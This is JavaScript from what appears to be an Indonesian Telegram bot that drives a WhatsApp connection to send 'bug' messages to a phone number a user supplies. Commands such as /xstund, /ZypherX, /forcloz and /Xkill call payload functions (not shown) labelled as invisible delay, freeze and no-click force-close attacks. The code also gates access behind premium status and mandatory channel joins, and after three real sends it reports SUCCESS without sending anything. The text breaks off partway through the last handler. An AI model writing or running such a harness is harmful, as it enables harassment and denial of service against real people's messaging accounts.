// ================================
// COMMAND DIUBAH MENJADI /xscry
bot.onText(/\/xstund(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /xstund 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /xstund 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI PREMIUM CONFIG =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const e1 = prem("5465616729092676098", "✅");
    const btnEmojiId = "4958621549474087897"; // 🖕 untuk Button

    // ===== CEK KONEKSI & STATUS =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    // UPDATE NAMA COMMAND DI PENGECEKAN AKTIF
    if (!isCmdActive("/xstund")) {
      return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xstund.").catch(() => {});
    }

    const chatType = msg.chat.type;
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.").catch(() => {});
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER").catch(() => {});
    }

    const isPremium = await premium(senderId);
    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.").catch(() => {});
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>⚠️ LINK BELUM DISET!\n\nSilahkan admin set dulu:\n/setautojoin</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>🚫 AKSES TERBATAS!\n\n🔒 Kamu wajib join semua link di bawah terlebih dahulu.\n✨ Setelah join, tekan tombol verifikasi di bawah.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }).catch(() => {});
      }
    }

    // ===== FAST RESPON NOTIFIKASI =====
    const messageText = `<blockquote>${e1} <b>BUGS SELESAI DI KIRIM UNTUK :</b> <code>${formattedNumber}</code></blockquote>`;

    // 1. KIRIM NOTIFIKASI LANGSUNG (Tanpa menunggu proses bug selesai)
    // Walaupun user nyepam berkali-kali, notif ini akan selalu terkirim dengan instan.
    bot.sendMessage(chatId, messageText, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🖕 { CHECK TARGET }", 
              url: `https://wa.me/${formattedNumber}`,
              icon_custom_emoji_id: btnEmojiId
            }
          ]
        ]
      }
    }).catch(() => {}); 

    // ===== OPTIMASI CPU (MENCEGAH MACET SAAT DI-SPAM) =====
    // 2. Jika nomor target sudah ada di dalam antrian (sedang diproses eksekusi bug),
    // Kita stop/return di sini agar eksekusi bug tidak bertumpuk ratusan kali dan bikin server hang.
    if (globalActiveProcesses.has(target)) {
      globalActiveProcesses.set(target, Date.now()); 
      return; 
    }
    globalActiveProcesses.set(target, Date.now());

    // 🔥 PROSES REAL SEND BUG DI BACKGROUND
    raraaimupp(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        
        // DETEKSI SENDER LEPAS (DELAY 10 DETIK)
        if (msgError.includes("connection") || msgError.includes("closed") || msgError.includes("disconnect")) {
          setTimeout(() => {
            const isConnected = sock && sock.user && sock.ws?.readyState === 1;
            if (!isConnected) {
              bot.sendMessage(chatId, "❌ Gagal mengirim bug: Koneksi WA terputus permanen (Sender mati). Silakan /addsender ulang.").catch(() => {});
            }
          }, 10000); 
        }
      })
      .finally(() => { 
  globalActiveProcesses.delete(target);
      });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem: ${e?.message}`).catch(() => {});
  }
});

// ---------------ZypherX-----------\\
// ================= ZypherX =================
// ===== BOT COMMAND =====
const processingTargetsZ = new Set();
const connectionFailCountZ = new Map();
const targetCycleCountZ = new Map();
const notifiedConnectionClosedZ = new Set(); // global per bot
let senderDeadNotifiedZ = false;

bot.onText(/\/ZypherX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /ZypherX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8) return bot.sendMessage(chatId, "Format salah, contoh: /ZypherX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMBEDDED EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = {
      thinkMsg: "5463343407197878047", // 🖤
      btnIcon: "5888952431185762037",  // 🗿
    };
    const e1 = prem(EMOJI.thinkMsg, "🖤");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedZ = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;
    
    if (!isCmdActive("/zypherx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /zypherx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountZ.get(target) || 0;
    targetCycleCountZ.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} INVISIBLE DELAY × FREZE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : INVISIBLE DELAY × FREZE
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return; // skip API, notif sudah dikirim

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsZ.has(target)) return;
    processingTargetsZ.add(target);

    // ===== LOG =====
    console.log(`[PROSES SEND BUG] -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp2(target)
      .then(() => {
        connectionFailCountZ.delete(target);
        notifiedConnectionClosedZ.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountZ.get(target) || 0;
          fail++;
          connectionFailCountZ.set(target, fail);

          if (fail >= 3) {
            // notif connection closed global
            notifiedConnectionClosedZ.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsZ.delete(target);
        targetCycleCountZ.delete(target);

        // 🔥 kirim notif ke semua user baru yang pakai fitur kalau connection closed global aktif
        if (notifiedConnectionClosedZ.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsXivor = new Set();
const connectionFailCountXivor = new Map();
const targetCycleCountXivor = new Map();
const notifiedConnectionClosedXivor = new Set(); // global per bot
let senderDeadNotifiedXivor = false;

bot.onText(/\/XivorX(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /XivorX 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8) return bot.sendMessage(chatId, "Format salah, contoh: /XivorX 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMBEDDED EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = {
      thinkMsg: "5979037639347542903", // 👻
      btnIcon: "5773800475329566949",  // 🔗
    };
    const e1 = prem("5208541126583136130", "🎉"); // emoji utama XivorX

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedXivor = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xivorx")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xivorx.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountXivor.get(target) || 0;
    targetCycleCountXivor.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} INVISIBLE DELAY × FREZE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : INVISIBLE DELAY × FREZE
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return; // skip API, notif sudah dikirim

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsXivor.has(target)) return;
    processingTargetsXivor.add(target);

    // ===== LOG =====
    console.log(`[PROSES SEND BUG] -> ${rawNumber}`);

    // ===== PROSES REAL SEND =====
    raraaimupp3(target)
      .then(() => {
        connectionFailCountXivor.delete(target);
        notifiedConnectionClosedXivor.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountXivor.get(target) || 0;
          fail++;
          connectionFailCountXivor.set(target, fail);

          if (fail >= 3) {
            // notif connection closed global
            notifiedConnectionClosedXivor.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsXivor.delete(target);
        targetCycleCountXivor.delete(target);

        // 🔥 kirim notif ke semua user baru yang pakai fitur kalau connection closed global aktif
        if (notifiedConnectionClosedXivor.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsN = new Set();
const connectionFailCountN = new Map();
const targetCycleCountN = new Map();
const notifiedConnectionClosedN = new Set(); // global
let senderDeadNotifiedN = false;

bot.onText(/\/forcloz(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /forcloz 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /Forcloz 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5992173732397848888" }; // 😱
    const e1 = prem("6100553439656284469", "😌");

    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedN = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/forcloz")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /forcloz.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);
    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }

    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(chatId, `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`, { parse_mode: "HTML" });
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(chatId, `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
      }
    }

    let count = targetCycleCountN.get(target) || 0;
    targetCycleCountN.set(target, count + 1);
    const isRealSend = count < 3;

    const userMention = (typeof mentionUserHTML === "function") ? mentionUserHTML(msg) : "User";
    const img = (typeof getImage === "function") ? getImage() : "https://via.placeholder.com/512";

    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE × INVIS</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose No Click Invis
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    console.log(`[FORCLOZ] Mengirim ke: ${formattedNumber}`);

    await bot.sendPhoto(chatId, img, {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "success",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    if (!isRealSend) return;
    if (processingTargetsN.has(target)) return;
    processingTargetsN.add(target);

    // ===== PROSES REAL SEND =====
    await raraaimupp4(target)
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();
        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountN.get(target) || 0;
          fail++;
          connectionFailCountN.set(target, fail);

          if (fail >= 2) {
            notifiedConnectionClosedN.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        } else {
          console.error("[FORCLOZ ERROR]", err);
        }
      })
      .finally(() => {
        processingTargetsN.delete(target);
        targetCycleCountN.delete(target);

        if (notifiedConnectionClosedN.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch (outer) {
    console.error("[FORCLOZ OUTER ERROR]", outer);
  }
});
// ================================
// ANTI DUPLICATE TARGET SYSTEM
// ================================
// ===== BOT COMMAND =====
const processingTargetsV = new Set();
const connectionFailCountV = new Map();
const targetCycleCountV = new Map();
const notifiedConnectionClosedV = new Set(); // global
let senderDeadNotifiedV = false;

bot.onText(/\/forexit(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /forexit 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /forexit 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    const EMOJI = {
      btnIcon: "5823498022947919928", // 👀
    };

    const e1 = prem("6258265158456447721", "⚡️");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      return bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
    }

    senderDeadNotifiedV = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/forexit")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /forexit.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }

    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountV.get(target) || 0;
    targetCycleCountV.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG =====
    const userMention = mentionUserHTML(msg);
    const messageText = `
<blockquote>
<b>${e1} FORCE CLOSE × INVISIBLE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : Forclose No Click Invis
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "danger",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND CHECK =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsV.has(target)) return;
    processingTargetsV.add(target);

    // ===== PROSES REAL SEND =====
    await raraaimupp5(target).catch((err) => {
      const msgError = String(err?.message || "").toLowerCase();

      if (msgError.includes("connection closed")) {
        let fail = connectionFailCountV.get(target) || 0;
        fail++;
        connectionFailCountV.set(target, fail);

        if (fail >= 2) {
          notifiedConnectionClosedV.add("GLOBAL");
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      }
    }).finally(() => {
      processingTargetsV.delete(target);
      targetCycleCountV.delete(target);

      if (notifiedConnectionClosedV.has("GLOBAL")) {
        bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
      }
    });

  } catch {}
});
// ===== BOT COMMAND =====
const processingTargetsK = new Set();
const connectionFailCountK = new Map();
const targetCycleCountK = new Map();
const notifiedConnectionClosedK = new Set(); // global
let senderDeadNotifiedK = false;

bot.onText(/\/Xkill(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /Xkill 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /Xkill 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5897997477692314735" }; // 🎸
    const e1 = prem("5404715222411799587", "🎁");

    // ===== CEK CONNECTION GLOBAL =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedK = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

    if (!isCmdActive("/xkill")) {
  return bot.sendMessage(chatId, "Fitur ini belum di nyalakan oleh owner kalau mau nyalakan ketik /aktif /xkill.");
}
    if (isGroupOnly() && chatType === "private") {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    const groupAllowed = chatType !== "private" && isGroupAllowed(chatId);

    if (!isPremium && !groupAllowed) {
      return bot.sendMessage(chatId, "Fitur ini hanya untuk user Premium / Group premium.");
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH OWNER");
    }
    // ===== AUTO JOIN CHECK =====
    if (autoJoinSettings?.enabled) {
      if (!autoJoinSettings.links || !autoJoinSettings.links.length) {
        return bot.sendMessage(
          chatId,
          `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
</blockquote>`,
          { parse_mode: "HTML" }
        );
      }

      let joined = false;
      try { joined = await isUserJoinedAll(bot, senderId, autoJoinSettings.links); } catch { joined = false; }

      if (!joined) {
        const buttons = autoJoinSettings.links.map((v, i) => [
          { text: `JOIN KAK #${i + 1}`, url: v.startsWith("@") ? `https://t.me/${v.slice(1)}` : v }
        ]);
        buttons.push([{ text: "✨ Verifikasi", callback_data: `AJVERIFY_${senderId}` }]);

        return bot.sendMessage(
          chatId,
          `<blockquote>
🚫 AKSES TERBATAS!

🔒 Kamu wajib join semua link di bawah terlebih dahulu.

✨ Setelah join, tekan tombol verifikasi di bawah.
</blockquote>`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } }
        );
      }
    }

    // ===== LIMIT & COUNT =====
    let count = targetCycleCountK.get(target) || 0;
    targetCycleCountK.set(target, count + 1);
    const isRealSend = count < 3;

    // ===== SUCCESS SEND BUG (REAL + FAKE) =====
    const userMention = mentionUserHTML(msg);

    const messageText = `
<blockquote>
<b>${e1} INVISIBLE DELAY × FREZE</b>

${a1} User   : ${userMention}
${a2} Target : <code>${formattedNumber}</code>
Type   : INVISIBLE DELAY × FREZE
${a3} Status : <b>SUCCESS</b>
</blockquote>
`.trim();

    await bot.sendPhoto(chatId, getImage(), {
      caption: messageText,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "㋡𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓ᯤ",
              url: `https://wa.me/${formattedNumber}`,
              style: "primary",
              icon_custom_emoji_id: EMOJI.btnIcon
            }
          ]
        ]
      }
    });

    // ===== FAKE SEND =====
    if (!isRealSend) return;

    // ===== ANTI DUPLIKAT =====
    if (processingTargetsK.has(target)) return;
    processingTargetsK.add(target);

    // ===== PROSES REAL SEND =====
    raraaimupp6(target)
      .then(() => {
        connectionFailCountK.delete(target);
        notifiedConnectionClosedK.delete("GLOBAL");
      })
      .catch((err) => {
        const msgError = String(err?.message || "").toLowerCase();

        if (msgError.includes("connection closed")) {
          let fail = connectionFailCountK.get(target) || 0;
          fail++;
          connectionFailCountK.set(target, fail);

          if (fail >= 3) {
            notifiedConnectionClosedK.add("GLOBAL");
            bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
          }
        }
      })
      .finally(() => {
        processingTargetsK.delete(target);
        targetCycleCountK.delete(target);

        // ===== GLOBAL NOTIF =====
        if (notifiedConnectionClosedK.has("GLOBAL")) {
          bot.sendMessage(chatId, "❌ Gagal mengirim bug: Connection Closed").catch(() => {});
        }
      });

  } catch {}
});
// ===== BOT COMMAND =====
const processingTargetsB = new Set();
const targetCycleCountB = new Map();
const connectionFailCountB = new Map();
const notifiedConnectionClosedB = new Set(); // global
let senderDeadNotifiedB = false;

bot.onText(/\/Xbugs(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match[1]) return bot.sendMessage(chatId, "Example: /Xbugs 628xxx");

  const rawNumber = match[1].replace(/[^0-9]/g, "");
  if (!rawNumber || rawNumber.length < 8)
    return bot.sendMessage(chatId, "Format salah, contoh: /Xbugs 628xxx");

  const target = `${rawNumber}@s.whatsapp.net`;
  const formattedNumber = rawNumber;

  try {
    // ===== EMOJI DI DALAM FITUR =====
    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
    const EMOJI = { btnIcon: "5891050557069595964" }; // 💀
    const e1 = prem("5913334054287054261", "💤");

    // ===== CEK CONNECTION =====
    if (!sock || (!sock.user && sock.ws?.readyState !== 1)) {
      bot.sendMessage(chatId, "❌ WhatsApp belum terhubung.\nGunakan /addsender").catch(() => {});
      return;
    }

    senderDeadNotifiedB = false;

    const isPremium = await premium(senderId);
    const chatType = msg.chat.type;

